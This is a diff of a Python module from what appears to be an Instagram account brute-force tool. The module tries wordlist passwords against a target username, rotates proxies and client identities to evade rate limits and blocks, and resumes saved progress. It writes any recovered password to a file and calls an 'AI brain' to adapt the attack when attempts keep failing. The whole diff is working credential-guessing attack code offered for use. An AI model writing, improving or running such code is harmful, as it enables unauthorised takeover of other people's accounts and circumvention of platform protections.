@@ -1,119 +1,272 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""Brute — live progress + auto proxy failover."""
-import json, os, sys, time, random
-from .api import InstagramAPI
-from .proxy import ProxyManager
-from .banner import info, ok, warn, err, C
+"""Brute force with live progress — n/total, %, bar, speed, ETA, current password."""
+import os
+import sys
+import json
+import time
+import random
 
-class BruteEngine:
-    def __init__(self, username, wordlist_path, output_dir="output", delay_min=3.0, delay_max=5.0,
-                 proxy=None, proxy_file=None, resume=False, ai_controller=None):
+try:
+    from .banner import info, ok, warn, err, ai, C, progress_bar
+    from .api import InstagramAPI
+except ImportError:
+    def info(m): print(f"[*] {m}")
+    def ok(m):   print(f"[+] {m}")
+    def warn(m): print(f"[!] {m}")
+    def err(m):  print(f"[-] {m}")
+    def ai(m):   print(f"[AI] {m}")
+    class C: R=G=Y=C=M=W=E=""
+    def progress_bar(c,t,p=""): return f"{p} {c}/{t}"
+    from api import InstagramAPI
+
+
+class BruteForce:
+    GPU = "█"  # filled bar char
+
+    def __init__(self, username, wordlist, output_dir="output",
+                 proxy_manager=None, delays=(3, 5), ai_brain=None):
         self.username = username.strip().lstrip("@")
-        self.wordlist_path = wordlist_path; self.output_dir = output_dir
-        self.delay_min = float(delay_min); self.delay_max = float(delay_max)
-        self.proxy_mgr = ProxyManager(proxy_file=proxy_file, proxy_url=proxy)
-        self.ai = ai_controller
-        if self.proxy_mgr.count: info("Validating proxies..."); self.proxy_mgr.validate_all()
+        self.wordlist = wordlist or []
+        self.output_dir = output_dir
+        self.proxy_manager = proxy_manager
+        self.delays = delays
+        self.ai_brain = ai_brain
         self.api = InstagramAPI()
-        self._found = None; self._tried = set(); self._cursor = 0; self._checkpoints = []
-        base = os.path.join(output_dir, self.username); os.makedirs(base, exist_ok=True)
-        self.progress_file = os.path.join(base, "progress.json")
-        self.found_file = os.path.join(base, "found.txt")
-        self.checkpoint_file = os.path.join(base, "checkpoints.txt")
-        if resume: self._load()
+        self.total = len(self.wordlist)
+        self.tested = 0
+        self.found = False
+        self.running = True
+        self.start_time = 0.0
+        self.session_fails = 0
+        self.consecutive_fails = 0
+        self.results = {"attempts": [], "found": None, "errors": []}
+        self._load_progress()
 
-    def _load(self):
-        try:
-            with open(self.progress_file, "r", encoding="utf-8") as f: d = json.load(f)
-            self._tried = set(d.get("tried", [])); self._cursor = int(d.get("cursor", 0))
-            info(f"Resume cursor={self._cursor} tried={len(self._tried)}")
-        except Exception: pass
+    def _progress_file(self):
+        return os.path.join(self.output_dir, self.username, "progress.json")
 
-    def _save(self):
-        try:
-            with open(self.progress_file, "w", encoding="utf-8") as f:
-                json.dump({"tried": list(self._tried)[-20000:], "cursor": self._cursor, "found": self._found}, f)
-        except Exception: pass
+    def _found_file(self):
+        return os.path.join(self.output_dir, self.username, "found.txt")
 
-    def _progress(self, i, total, password, start, extra=""):
-        elapsed = max(time.time() - start, 0.001); rate = i / elapsed
-        left = max(total - i, 0); eta = int(left / rate) if rate > 0 else 0
-        h, r = divmod(eta, 3600); m, s = divmod(r, 60)
-        eta_s = f"{h}h{m:02d}m" if h else f"{m}m{s:02d}s"
-        pct = (i / total) * 100 if total else 0; bar_len = 18
-        filled = int(bar_len * i / total) if total else 0
-        bar = "█" * filled + "░" * (bar_len - filled)
-        pw = password if len(password) <= 26 else password[:23] + "..."
-        line = f"\r{C.C}[{i}/{total}]{C.E} {C.G}{bar}{C.E} {pct:5.1f}% | {rate:4.2f}/s | ETA {eta_s} | pwd: {C.Y}{pw}{C.E}{extra}   "
-        sys.stdout.write(line); sys.stdout.flush()
+    def _load_progress(self):
+        pf = self._progress_file()
+        if os.path.isfile(pf):
+            try:
+                with open(pf, "r", encoding="utf-8") as f:
+                    self.results = json.load(f)
+                old_tested = len(self.results.get("attempts", []))
+                if old_tested > 0:
+                    info(f"Resuming from {old_tested}/{self.total}")
+                    self.wordlist = self.wordlist[old_tested:]
+            except Exception:
+                pass
+
+    def _save_progress(self):
+        os.makedirs(os.path.dirname(self._progress_file()), exist_ok=True)
+        with open(self._progress_file(), "w", encoding="utf-8") as f:
+            json.dump(self.results, f, indent=2, ensure_ascii=False)
+
+    def _save_found(self, password):
+        with open(self._found_file(), "w", encoding="utf-8") as f:
+            f.write(f"username: {self.username}\npassword: {password}\n")
+        ok(f"SAVED → {self._found_file()}")
+
+    # ── MAIN LOOP ──
 
     def run(self):
-        passwords = []
-        try:
-            with open(self.wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
-                for line in f:
-                    pw = line.strip()
-                    if pw and pw not in self._tried: passwords.append(pw)
-        except FileNotFoundError: err(f"Wordlist not found: {self.wordlist_path}"); return None
-        if not passwords: warn("No passwords left to test"); return None
-        total = len(passwords); print()
-        info(f"Target     : @{self.username}"); info(f"Passwords  : {total}")
-        info(f"Already    : {len(self._tried)}")
-        info(f"Delay      : {self.delay_min}-{self.delay_max}s | proxies alive: {self.proxy_mgr.alive_count}")
+        if not self.wordlist:
+            err("Empty wordlist!")
+            return None
+
+        self.start_time = time.time()
+        self.running = True
+        self.found = False
+
         print()
-        start = time.time(); done = 0
-        try:
-            for password in passwords:
-                if self._found: break
-                self._cursor += 1; done += 1; self._tried.add(password)
-                purl = self.proxy_mgr.get_next(); max_retries = 3
-                for attempt in range(max_retries):
-                    self.api.set_proxy(purl if purl else None)
-                    if done % 5 == 0 or attempt > 0: self.api._rotate_identity()
-                    result = self.api.try_login(self.username, password); extra = ""
+        info(f"Starting brute force — {self.total} passwords")
+        info(f"Target: @{self.username}")
+        info(f"Delay: {self.delays[0]}-{self.delays[1]}s")
+        print()
 
-                    if result.get("success"): self._found = password; print(); ok(f"FOUND → {password}"); break
-                    st = result.get("status", "")
+        last_save_time = time.time()
 
-                    if st in ("timeout", "connection_error"):
-                        if purl: self.proxy_mgr.mark_dead(purl); warn(f"Proxy dead: {purl}")
-                        purl = self.proxy_mgr.get_next()
-                        if purl and attempt < max_retries - 1:
-                            extra = f" | retry {attempt+2}/{max_retries}"
-                            self._progress(done, total, password, start, extra)
-                            time.sleep(random.uniform(1, 2)); continue
-                        else: extra = " | all proxies dead — DIRECT"; self.api.set_proxy(None)
-                        result = self.api.try_login(self.username, password); st = result.get("status", ""); break
+        for i, password in enumerate(self.wordlist):
+            if not self.running:
+                warn("Stopped by user")
+                break
 
-                    if st == "checkpoint":
-                        self._checkpoints.append(password)
-                        try:
-                            with open(self.checkpoint_file, "a", encoding="utf-8") as cf: cf.write(password + "\n")
-                        except Exception: pass
-                        extra = f" | {C.Y}CHECKPOINT{C.E}"
-                    elif st == "rate_limited":
-                        extra = f" | {C.R}RATE-LIMIT{C.E}"
-                        self._progress(done, total, password, start, extra)
-                        # AI adapts delay
-                        if self.ai: self.ai.remember("rate_limited", self.username)
-                        time.sleep(random.uniform(45, 100))
-                    elif st == "invalid_user": print(); err("Username invalid — stop"); break
-                    if purl and st not in ("timeout", "connection_error"): self.proxy_mgr.mark_alive(purl)
+            self.tested = i + 1
+            current_proxy = None
+
+            try:
+                # Get proxy
+                if self.proxy_manager:
+                    current_proxy = self.proxy_manager.get_next()
+                    self.api.set_proxy(current_proxy)
+
+                # Try login
+                result = self.api.try_login(self.username, password)
+
+                # Record
+                entry = {
+                    "index": i,
+                    "password": password,
+                    "status": result.get("status", "unknown"),
+                    "time": time.time() - self.start_time,
+                }
+                self.results["attempts"].append(entry)
+
+                # Handle result
+                self._handle_result(result, password, current_proxy)
+
+                # Save progress
+                if time.time() - last_save_time > 5:
+                    self._save_progress()
+                    last_save_time = time.time()
+
+                # AI brain feedback
+                if self.ai_brain:
+                    self.ai_brain.record_attempt(password, result)
+
+                # Live output
+                self._live_display(i, password, result)
+
+                if self.found:
                     break
-                else: extra = " | no proxy worked"
-                if result.get("status") == "invalid_user": break
-                self._progress(done, total, password, start, extra)
-                if done % 20 == 0: self._save(); self.proxy_mgr.show_stats()
-                time.sleep(random.uniform(self.delay_min, self.delay_max))
-        except KeyboardInterrupt: print(); warn("Interrupted — progress saved"); self._save(); return self._found
-        print(); self._save()
-        elapsed = time.time() - start
-        print(f"{C.C}{'═' * 48}{C.E}")
-        print(f"  Done @{self.username} | tried {done} | {elapsed:.0f}s")
-        print(f"  Found: {self._found or 'none'}"); print(f"  Checkpoints: {len(self._checkpoints)}")
-        self.proxy_mgr.show_stats(); print(f"{C.C}{'═' * 48}{C.E}")
-        if self._found:
-            with open(self.found_file, "w", encoding="utf-8") as f: f.write(self._found)
-            ok(f"Saved → {self.found_file}")
-        return self._found
+
+                # Delay
+                d = random.uniform(self.delays[0], self.delays[1])
+                if result.get("status") == "rate_limited":
+                    d += random.uniform(30, 60)
+                    warn("Rate limited — longer delay...")
+                time.sleep(d)
+
+            except KeyboardInterrupt:
+                print()
+                warn("Interrupted — progress saved")
+                self._save_progress()
+                self.running = False
+                break
+            except Exception as e:
+                err(f"Unexpected error: {e}")
+                if current_proxy and self.proxy_manager:
+                    self.proxy_manager.mark_dead(current_proxy)
+                self.results["errors"].append({"index": i, "password": password, "error": str(e)})
+
+        self._save_progress()
+
+        if self.found:
+            total_time = time.time() - self.start_time
+            m, s = divmod(int(total_time), 60)
+            print(f"\n{C.G}{'='*50}{C.E}")
+            print(f"{C.G}  PASSWORD FOUND!{C.E}")
+            print(f"{C.G}  Username : @{self.username}{C.E}")
+            print(f"{C.G}  Password : {self.results.get('found',{}).get('password','?')}{C.E}")
+            print(f"{C.G}  Time     : {m}m {s}s{C.E}")
+            print(f"{C.G}  Attempts : {self.tested}{C.E}")
+            print(f"{C.G}{'='*50}{C.E}")
+            return self.results["found"]
+        else:
+            err(f"Not found — {self.tested} passwords tested")
+            return None
+
+    def _handle_result(self, result, password, proxy_url):
+        status = result.get("status", "unknown")
+
+        if status == "ok" or result.get("success") is True:
+            self.found = True
+            self.running = False
+            self.results["found"] = {"password": password, "raw": result}
+            self._save_found(password)
+            if self.proxy_manager:
+                self.proxy_manager.mark_alive(proxy_url)
+            return
+
+        if status == "bad_password":
+            self.consecutive_fails = 0
+            if self.proxy_manager:
+                self.proxy_manager.mark_alive(proxy_url)
+
+        elif status == "proxy_error":
+            if self.proxy_manager:
+                self.proxy_manager.mark_dead(proxy_url)
+            self.session_fails += 1
+            self.consecutive_fails += 1
+
+        elif status in ("timeout", "connection_error"):
+            self.session_fails += 1
+            self.consecutive_fails += 1
+            if self.proxy_manager and proxy_url:
+                self.proxy_manager.mark_dead(proxy_url)
+
+        elif status == "rate_limited":
+            if self.proxy_manager and proxy_url:
+                self.proxy_manager.mark_dead(proxy_url)
+            self.session_fails += 1
+            self.consecutive_fails += 1
+
+        elif status == "checkpoint":
+            self.consecutive_fails = 0
+            warn(f"Account has checkpoint: @{self.username}")
+            if self.proxy_manager:
+                self.proxy_manager.mark_alive(proxy_url)
+
+        elif status == "invalid_user":
+            err(f"User @{self.username} does not exist!")
+            self.running = False
+
+        # AI heals
+        if self.ai_brain and self.consecutive_fails >= 3:
+            self.ai_brain.heal(self)
+
+    def _live_display(self, i, password, result):
+        elapsed = time.time() - self.start_time
+        pct = (i + 1) / self.total * 100
+
+        # Speed
+        speed = (i + 1) / max(elapsed, 0.1)
+        speed_str = f"{speed:.1f}/s" if speed < 60 else f"{speed/60:.1f}/m"
+
+        # ETA
+        eta = (self.total - i - 1) / max(speed, 0.01)
+        if eta < 120:
+            eta_str = f"{int(eta)}s"
+        elif eta < 7200:
+            eta_str = f"{eta/60:.1f}m"
+        else:
+            eta_str = f"{eta/3600:.1f}h"
+
+        # Bar
+        bw = 30
+        filled = int(bw * (i + 1) / self.total)
+        bar = f"{C.G}{self.GPU * filled}{C.D}{self.GPU * (bw - filled)}{C.E}"
+
+        # Status icon
+        st = result.get("status", "?")
+        if st == "bad_password":
+            icon = f"{C.R}✗{C.E}"
+        elif st == "ok" or result.get("success"):
+            icon = f"{C.G}✓ FOUND!{C.E}"
+        elif st in ("proxy_error", "timeout"):
+            icon = f"{C.Y}↻{C.E}"
+        elif st == "rate_limited":
+            icon = f"{C.Y}⏱{C.E}"
+        else:
+            icon = f"{C.Y}?{C.E}"
+
+        pw_display = password[:24] + ".." if len(password) > 26 else password
+
+        sys.stdout.write(
+            f"\r  {icon} [{bar}] {pct:5.1f}% | "
+            f"{i+1}/{self.total} | {speed_str} | ETA {eta_str} | "
+            f"{pw_display:<28} "
+        )
+        sys.stdout.flush()
+
+        if self.found or st in ("invalid_user", "checkpoint"):
+            print()
+
+    def stop(self):
+        self.running = False
+        self._save_progress()
